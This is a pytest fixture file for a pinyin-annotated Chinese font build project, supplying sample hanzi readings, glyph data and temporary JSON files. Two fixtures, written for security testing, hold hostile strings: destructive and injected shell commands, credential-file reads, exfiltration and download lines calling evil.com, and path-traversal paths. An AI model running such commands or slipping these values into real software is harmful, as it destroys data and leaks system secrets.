# -*- coding: utf-8 -*-
"""
Test configuration and fixtures for the Mengshen Font project.
"""

import shutil
import sys
import tempfile
from pathlib import Path

import pytest

# Add src to path for imports
sys.path.insert(0, str(Path(__file__).parent.parent / "src"))

from refactored.config import FontType, ProjectPaths


@pytest.fixture
def temp_dir():
    """Create a temporary directory for test files."""
    temp_dir = tempfile.mkdtemp()
    yield Path(temp_dir)
    shutil.rmtree(temp_dir)


@pytest.fixture
def project_paths():
    """Provide project paths for testing."""
    return ProjectPaths()


@pytest.fixture
def sample_font_types():
    """Provide sample font types for testing."""
    return [FontType.HAN_SERIF, FontType.HANDWRITTEN]


@pytest.fixture
def sample_hanzi_data():
    """Provide sample hanzi data for testing."""
    return {
        "中": ["zhōng", "zhòng"],  # Multiple pronunciations
        "国": ["guó"],  # Single pronunciation
        "人": ["rén"],  # Single pronunciation
        "大": ["dà", "dài"],  # Multiple pronunciations
        "的": ["de", "dí", "dì"],  # Multiple pronunciations
        "了": ["le", "liǎo"],  # Multiple pronunciations
    }


@pytest.fixture
def sample_cmap_data():
    """Provide sample cmap data for testing."""
    return {
        "20013": "cid00001",  # 中 (U+4E2D)
        "22269": "cid00002",  # 国 (U+56FD)
        "20154": "cid00003",  # 人 (U+4EBA)
        "22823": "cid00004",  # 大 (U+5927)
        "30340": "cid00005",  # 的 (U+7684)
        "20102": "cid00006",  # 了 (U+4E86)
    }


@pytest.fixture
def sample_glyph_data():
    """Provide sample glyph data for testing."""
    return {
        "cid00001": {
            "advanceWidth": 1000,
            "advanceHeight": 1000,
            "contours": [
                [
                    {"x": 100, "y": 100, "on": True},
                    {"x": 900, "y": 100, "on": True},
                    {"x": 900, "y": 900, "on": True},
                    {"x": 100, "y": 900, "on": True},
                ]
            ],
        }
    }


@pytest.fixture
def sample_pronunciation_data():
    """Provide sample pronunciation data for testing."""
    return {
        "zhōng": {
            "advanceWidth": 1000,
            "advanceHeight": 1200,
            "verticalOrigin": 1056,
            "references": [
                {
                    "glyph": "py_alphablet_z",
                    "x": 0,
                    "y": 935,
                    "a": 1,
                    "b": 0,
                    "c": 0,
                    "d": 1,
                },
                {
                    "glyph": "py_alphablet_h",
                    "x": 200,
                    "y": 935,
                    "a": 1,
                    "b": 0,
                    "c": 0,
                    "d": 1,
                },
                {
                    "glyph": "py_alphablet_o3",
                    "x": 400,
                    "y": 935,
                    "a": 1,
                    "b": 0,
                    "c": 0,
                    "d": 1,
                },
                {
                    "glyph": "py_alphablet_n",
                    "x": 600,
                    "y": 935,
                    "a": 1,
                    "b": 0,
                    "c": 0,
                    "d": 1,
                },
                {
                    "glyph": "py_alphablet_g",
                    "x": 800,
                    "y": 935,
                    "a": 1,
                    "b": 0,
                    "c": 0,
                    "d": 1,
                },
            ],
        }
    }


@pytest.fixture
def sample_malicious_commands():
    """Provide sample malicious commands for security testing."""
    return [
        "rm -rf /",
        "cat /etc/passwd",
        "curl http://evil.com/steal?data=$(cat /etc/passwd)",
        "python -c 'import os; os.system(\"rm -rf /\")'",
        "otfccbuild input.json -o output.ttf; rm -rf /",
        "input.json && rm -rf /",
        "input.json || rm -rf /",
        "input.json; cat /etc/passwd",
        "$(cat /etc/passwd)",
        "`cat /etc/passwd`",
        "input.json | nc evil.com 1234",
        "input.json > /dev/null; wget http://evil.com/shell.sh",
    ]


@pytest.fixture
def sample_path_traversal_attacks():
    """Provide sample path traversal attacks for security testing."""
    return [
        "../../../etc/passwd",
        "..\\..\\..\\windows\\system32\\config\\sam",
        "/etc/passwd",
        "C:\\Windows\\System32\\config\\SAM",
        "../../../../usr/bin/python",
        "../../../../../../etc/shadow",
        "~/../../etc/passwd",
        "file:///etc/passwd",
        "\\\\evil.com\\share\\malware.exe",
    ]


@pytest.fixture
def create_test_files(temp_dir):
    """Create test files for integration testing."""
    test_files = {}

    # Create sample template main JSON
    template_main = {
        "cmap": {
            "20013": "cid00001",
            "22269": "cid00002",
        },
        "glyf": {
            "cid00001": {"advanceWidth": 1000, "advanceHeight": 1000, "contours": []}
        },
        "head": {"fontRevision": 1.0},
        "hhea": {"ascender": 880},
        "OS_2": {"usWinAscent": 880},
    }

    template_main_path = temp_dir / "template_main_test.json"
    with open(template_main_path, "w", encoding="utf-8") as f:
        import json

        json.dump(template_main, f, indent=2)
    test_files["template_main"] = template_main_path

    # Create sample glyf JSON
    glyf_data = {
        "cid00001": {
            "advanceWidth": 1000,
            "advanceHeight": 1000,
            "contours": [
                [
                    {"x": 100, "y": 100, "on": True},
                    {"x": 900, "y": 100, "on": True},
                    {"x": 900, "y": 900, "on": True},
                    {"x": 100, "y": 900, "on": True},
                ]
            ],
        }
    }

    glyf_path = temp_dir / "template_glyf_test.json"
    with open(glyf_path, "w", encoding="utf-8") as f:
        import json

        json.dump(glyf_data, f, indent=2)
    test_files["glyf"] = glyf_path

    # Create sample alphabet JSON
    alphabet_data = {
        "a": {
            "advanceWidth": 600,
            "advanceHeight": 800,
            "contours": [
                [
                    {"x": 50, "y": 50, "on": True},
                    {"x": 550, "y": 50, "on": True},
                    {"x": 550, "y": 750, "on": True},
                    {"x": 50, "y": 750, "on": True},
                ]
            ],
        },
        "ā": {
            "advanceWidth": 600,
            "advanceHeight": 800,
            "contours": [
                [
                    {"x": 50, "y": 50, "on": True},
                    {"x": 550, "y": 50, "on": True},
                    {"x": 550, "y": 750, "on": True},
                    {"x": 50, "y": 750, "on": True},
                ]
            ],
        },
    }

    alphabet_path = temp_dir / "alphabet_test.json"
    with open(alphabet_path, "w", encoding="utf-8") as f:
        import json

        json.dump(alphabet_data, f, indent=2)
    test_files["alphabet"] = alphabet_path

    return test_files


@pytest.fixture
def mock_external_tools(monkeypatch):
    """Mock external tools for testing."""

    def mock_otfcc_command(*args, **kwargs):
        # Mock successful otfcc command
        return type(
            "MockResult",
            (),
            {"returncode": 0, "stdout": "Font built successfully", "stderr": ""},
        )()

    monkeypatch.setattr("subprocess.run", mock_otfcc_command)
    return mock_otfcc_command


# Note: Removed unused fixtures: performance_thresholds, security_test_environment, legacy_output_baseline
# These were not used in any test files and added unnecessary complexity.
